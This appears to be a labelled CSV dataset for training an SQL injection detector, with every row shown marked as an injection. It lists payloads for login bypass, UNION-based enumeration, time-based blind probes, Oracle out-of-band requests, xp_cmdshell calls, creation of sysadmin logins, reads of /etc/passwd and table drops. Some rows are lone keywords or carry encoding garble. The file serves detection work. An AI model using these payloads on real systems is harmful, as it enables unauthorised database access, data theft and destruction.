Sentence,Label,EtiqManual
select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,1,0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,0
or 1  =  1 or ''  =  ',1,0
select * from users where id  =  1   or 1  =  1 -- 1,1,0
or 'text' > 't',1,0
"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1,0
" select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",1,0
admin' or '1'  =  '1'#,1,0
select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,1,0
s,1,0
 select * from information_schema.tables--,1,0
" select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",1,0
1   )    )    or pg_sleep  (  __TIME__  )  --,1,0
" select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",1,0
declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,1,0
 or 1  =  1 or ''  =  ',1,0
select * from users where id  =  1 %!<1 or 1  =  1 -- 1,1,0
declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,1,0
" select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",1,0
" select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",1,0
or 'unusual'   =   'unusual',1,0
 or 1 in   (  select @@version  )  --,1,0
truncate,1,0
as,1,0
" select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",1,0
" select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",1,0
"admin""  )   or   (  ""1""  =  ""1",1,0
"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1,0
" select * from users where id  =  1 union select .1_,version  (    )   -- 1",1,0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,1,0
" or 0  =  0 #""",1,0
1  )   or sleep  (  __TIME__  )  #,1,0
" select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",1,0
" select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",1,0
" select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",1,0
select * from users where id  =  1. <@ or 1  =  1 -- 1,1,0
 or true--,1,0
 execute immediate 'sel' || 'ect us' || 'er',1,0
hi' or 'x'  =  'x',1,0
select * from users where id  =  1 <@ or 1  =  1 -- 1,1,0
admin' #,1,0
" select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",1,0
" select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",1,0
" union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1,0
"""  )  ;waitfor delay '0:0:__TIME__'--",1,0
 or 'unusual'   =   'unusual',1,0
"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",1,0
"admin"" or ""1""  =  ""1""/*",1,0
" select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",1,0
" select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1",1,0
like,1,0
or username like char  (  37  )  ,1,0
 )    )    or pg_sleep  (  __TIME__  )  --,1,0
or 3  =  3,1,0
select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,1,0
exec sp,1,0
" select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",1,0
select * from users where id  =  1 or \<$ or 1  =  1 -- 1,1,0
" select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",1,0
admin' or 1  =  1/*,1,0
a' waitfor delay '0:0:10'--,1,0
" select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",1,0
" select * from users where id  =  1 union select .1$_,version  (    )   -- 1",1,0
and 1 in   (  select var from temp  )  --,1,0
hi'  )   or   (  'a'  =  'a,1,0
"admin"" or 1  =  1",1,0
"""  )   or true--",1,0
" select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",1,0
1  )   or pg_sleep  (  __TIME__  )  --,1,0
"""  )   or sleep  (  __TIME__  )    =  """,1,0
select * from users where id  =  1.<@. or 1  =  1 -- 1,1,0
"admin""  )   or   (  ""1""  =  ""1""--",1,0
 exec xp_regread,1,0
" select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1,0
select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,1,0
" select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",1,0
1 and 1  =  1,1,0
or 0  =  0 #,1,0
union select * from users where login   =   char ...,1,0
" select * from users where id  =  1 union select 1||@,version  (    )   -- 1",1,0
admin'  )   or '1'  =  '1'--,1,0
SELECT *,1,0
" select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",1,0
x' and 1  =    (  select count  (  *  )   from tabname  )  ,1,0
" select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",1,0
" select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,0
"1 or benchmark  (  10000000,MD5  (  1   )    )   #",1,0
procedure,1,0
or ''  =  ',1,0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,1,0
\',1,0
" select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",1,0
select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',1,0
""" or """"^""",1,0
"""-""",1,0
" select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",1,0
" select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",1,0
" select * from users where id  =  1 *\ union select null,@@VERSION -- 1",1,0
" select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",1,0
admin'/*,1,0
||UTL_HTTP.REQUEST,1,0
" select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",1,0
"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1,0
" select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",1,0
select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',1,0
1 uni/**/on select all from where,1,0
" select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",1,0
admin'  )   or '1'  =  '1'#,1,0
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1,0
or '7659'  =  '7659,1,0
" select * from users where id  =  1 union select +!<1,version  (    )   -- 1",1,0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,0
or true--,1,0
" select * from users where id  =  1 union select !<1,version  (    )   -- 1",1,0
" select * from users where id  =  '1' union select \#,@@VERSION -- 1'",1,0
""" or true--",1,0
select * from users where id  =  1. or 1  =  1 -- 1,1,0
" select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",1,0
â or 3  =  3 --,1,0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,1,0
" select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",1,0
" select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",1,0
" select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",1,0
" select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",1,0
 or uid like '%,1,0
select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',1,0
" select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",1,0
23 or 1  =  1,1,0
" select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",1,0
select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,1,0
" select * from users where id  =  '1' union select \,@@VERSION -- 1'",1,0
0 or 1  =  1,1,0
select * from users where id  =  1 &@ or 1  =  1 -- 1,1,0
"admin""  )   or ""1""  =  ""1",1,0
select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,1,0
&apos,1,0
sqlvuln,1,0
select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,1,0
select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',1,0
""" or """"*""",1,0
"hi or 1  =  1 --""",1,0
" select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",1,0
 exec master..xp_cmdshell 'ping 172.10.1.255'--,1,0
" select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,0
" select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",1,0
select * from information_schema.tables--,1,0
   (  select top 1,1,0
Ã½ or 1  =  1 --,1,0
a' --,1,0
 or 1  =  1 /*,1,0
" select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",1,0
--,1,0
"exec sp_addlogin 'name' , 'password'",1,0
" select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",1,0
0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,1,0
" select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",1,0
group by userid having 1  =  1--,1,0
" select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1",1,0
select * from users where id  =  1 *1 or 1  =  1 -- 1,1,0
" select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",1,0
‘ or 1  =  1 --,1,0
" select * from users where id  =  1 *\. union select null,@@VERSION -- 1",1,0
select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,1,0
or 'a'  =  'a,1,0
declare @s varchar  (  22  )   select @s   = ,1,0
" select * from users where id  =  1 union select 1<@,version  (    )   -- 1",1,0
@variable,1,0
 exec master..xp_cmdshell,1,0
select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,1,0
" select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1,0
" select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",1,0
" select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",1,0
" select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",1,0
 and 1 in   (  select var from temp  )  --,1,0
" select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",1,0
or x  =  x,1,0
or a  =  a,1,0
or '1'  =  '1,1,0
" select * from users where id  =  11<1# union select 1,version  (    )   -- 1",1,0
   )    )    or    (    (   'x'   )    )     =     (    (   'x,1,0
" select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",1,0
" select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",1,0
 if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --,1,0
select * from users where id  =  1 <@<@ or 1  =  1 -- 1,1,0
" select * from users where id  =  1 union select @<@$,version  (    )   -- 1",1,0
" select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",1,0
a' or 1  =  1--,1,0
 )   or   (  a  =  a,1,0
"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",1,0
" select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",1,0
" select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",1,0
-- &password  = ,1,0
" select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",1,0
" select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",1,0
 or '1'  =  '1,1,0
admin' or 1  =  1,1,0
" select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",1,0
" select * from users where id  =  1 union select @||1,version  (    )   -- 1",1,0
" select * from users where id  =  1 +\+. union select null,@@VERSION -- 1",1,0
" union select * from users where login   =   char  (  114,111,111,116  )  ;",1,0
 or 1  =  1--,1,0
pg_sleep  (  __TIME__  )  --,1,0
 )   union select * from information_schema.tables,1,0
"  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1,0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i,1,0
""" or """" """,1,0
delete,1,0
waitfor delay '0:0:__TIME__'--,1,0
1' and non_existant_table   =   '1,1,0
" select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",1,0
declare @s varchar  (  200  )   select @s   =   0x77616974 ...,1,0
x' AND userid IS NULL,1,0
" select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",1,0
" select * from users where id  =  1 union select @<@,version  (    )   -- 1",1,0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,1,0
UNION ALL SELECT,1,0
select * from users where id  =  1 or \<1 or 1  =  1 -- 1,1,0
" select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",1,0
x' or full_name like '%bob%,1,0
x' and members.email is NULL,1,0
 or 2 > 1,1,0
select * from users where id  =  1.*1 or 1  =  1 -- 1,1,0
"""  )   or pg_sleep  (  __TIME__  )  --",1,0
 ',1,0
 )   or sleep  (  __TIME__  )    =  ',1,0
sleep 50',1,0
" select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,0
select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,1,0
" select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",1,0
or sleep  (  __TIME__  )    =  ',1,0
" select * from users where id  =  1 or "";_"" or 1  =  1 -- 1",1,0
" select * from users where id  =  1 union select  @ $,version  (    )   -- 1",1,0
" select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",1,0
or 2 > 1,1,0
 exec   (  'sel' + 'ect us' + 'er'  ) ,1,0
anything' OR 'x'  =  'x,1,0
" select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",1,0
" select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",1,0
&',1,0
" select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",1,0
"admin""or 1  =  1 or """"  =  """,1,0
uni/**/on sel/**/ect,1,0
""" or """"&""",1,0
1 waitfor delay '0:0:10'--,1,0
bfilename,1,0
admin'  )   or   (  '1'  =  '1'--,1,0
UEf,1,0
 -- &password  = ,1,0
1 or sleep  (  __TIME__  )  #,1,0
" select * from users where id  =  '1' union select $[""],@@VERSION -- 1'",1,0
" select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",1,0
1' and 1  =    (  select count  (  *  )   from tablenames  )  ,1,0
or sleep  (  __TIME__  )  #,1,0
" select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",1,0
||6,1,0
or 1/*,1,0
" and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",1,0
select * from users where id  =  1.%@ or 1  =  1 -- 1,1,0
" select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",1,0
" select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1",1,0
" or 1  =  1 or """"  =  ",1,0
" select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1,0
or 'whatever' in   (  'whatever'  ) ,1,0
declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,1,0
select * from users where id  =  '1'   or 1  =  1 -- 1',1,0
?,1,0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,1,0
" select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",1,0
"admin""  )   or   (  ""1""  =  ""1""#",1,0
 or '' ',1,0
 drop table temp --,1,0
""" or benchmark  (  10000000,MD5  (  1   )    )   #",1,0
""" or ""x""  =  ""x",1,0
select * from users where id  =  '1'<@.. or 1  =  1 -- 1',1,0
" select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",1,0
 or 'something' like 'some%',1,0
 if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --,1,0
 exec master..xp_cmdshell 'ping 10.10.1.2'--,1,0
admin' or '1'  =  '1'--,1,0
" select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1",1,0
""";waitfor delay '0:0:__TIME__'--",1,0
select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1',1,0
" select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",1,0
’ or ‘1’  =  ’1,1,0
" select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",1,0
admin'or 1  =  1 or ''  =  ',1,0
" select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",1,0
" and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",1,0
exec  (  @s  ) ,1,0
" select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",1,0
" select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",1,0
 or 1  =  1,1,0
select * from users where id  =  1 + $+%1 or 1  =  1 -- 1,1,0
" select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",1,0
x' AND email IS NULL,1,0
" select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",1,0
 --,1,0
" select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",1,0
" select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1",1,0
" select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1",1,0
update,1,0
 or 1/*,1,0
" select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",1,0
"""   )    )    or pg_sleep  (  __TIME__  )  --",1,0
||'6,1,0
" select * from users where id  =  1. <@ union select 1,version  (    )   -- 1",1,0
or   (  EXISTS  ) ,1,0
^',1,0
or 'text'   =   n'text',1,0
" select * from users where id  =  '1' union select $ _,@@VERSION -- 1'",1,0
 or 0  =  0 --,1,0
" select * from users where id  =  1 or ""{1""  =  1 or 1  =  1 -- 1",1,0
password:*/  =  1--,1,0
" select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",1,0
" union   (  select NULL,   (  select @@version   )    )    --",1,0
" select * from users where id  =  1 + @<@. union select 1,version  (    )   -- 1",1,0
" select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",1,0
" select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1",1,0
" select * from users where id  =  1. union select null,version  (    )   -- 1",1,0
" select * from users where id  =  1 or \.<1 union select 1,@@VERSION -- 1",1,0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i,1,0
select * from users where id  =  1 <@$_ or 1  =  1 -- 1,1,0
" select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",1,0
UNION SELECT,1,0
asc,1,0
" || myappadmin.adduser  (  'admin', 'newpass'  )   || '",1,0
"exec sp_addsrvrolemember 'name' , 'sysadmin'",1,0
" select * from users where id  =  1 or   (  \  )    =  1 union select 1,@@VERSION -- 1",1,0
  )   or true--,1,0
 or userid like '%,1,0
" union   (  select NULL, NULL,   (  select @@version   )    )    --",1,0
/,1,0
"admin""/*",1,0
" select * from users where id  =  1.  union select 1,version  (    )   -- 1",1,0
) ) ,1,0
"admin"" or ""1""  =  ""1",1,0
 union   (  select @@version  )   --,1,0
 or ''^',1,0
"""   )    )    or sleep  (  __TIME__  )    =  """,1,0
" union   (  select NULL, NULL, NULL, NULL,  NULL,   (  select @@version   )    )    --",1,0
" select * from users where id  =  1 union select @ _,version  (    )   -- 1",1,0
select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1,1,0
select * from users where id  =  '1' <@$_ or 1  =  1 -- 1',1,0
"""hi""""  )   or   (  """"a""""  =  """"a""",1,0
select name from syscolumns where id   =     (  sele ...,1,0
" select * from users where id  =  1 or ""1,"" or 1  =  1 -- 1",1,0
" select * from users where id  =  '1' + @<@# union select 1,version  (    )   -- 1'",1,0
 or 2 between 1 and 3,1,0
union all select @@version--,1,0
t'exec master..xp_cmdshell 'nslookup www.google.com'--,1,0
""" or isNULL  (  1/0  )   /*",1,0
" select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",1,0
declare @q nvarchar   (  200  )   0x730065006c00650063 ...,1,0
 or 'a'  =  'a,1,0
 union all select @@version--,1,0
" select * from users where id  =  1 or  1<@  =  1 union select 1,version  (    )   -- 1",1,0
"admin"" or 1  =  1/*",1,0
 or   (  EXISTS  ) ,1,0
" select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",1,0
" select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",1,0
" select * from users where id  =  1 union select 1 1a,version  (    )   -- 1",1,0
 begin declare @var varchar  (  8000  )   set @var  =  ':' select @var  =  @var+'+login+'/'+password+' ' from users where login >,1,0
" union   (  select NULL, NULL, NULL, NULL,    (  select @@version   )    )    --",1,0
hi' or 1  =  1 --,1,0
 UNION SELECT,1,0
" select * from users where id  =  1 or 1#""  (   union select 'a',version  (    )   -- 1",1,0
desc,1,0
" select * from users where id  =  1 or "",  )  ""  =  1 or 1  =  1 -- 1",1,0
" select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",1,0
0x770061006900740066006F0072002000640065006C00 ...,1,0
" select * from users where id  =  1 -@<@ union select version  (    )  ,version  (    )   -- 1",1,0
or isNULL  (  1/0  )   /*,1,0
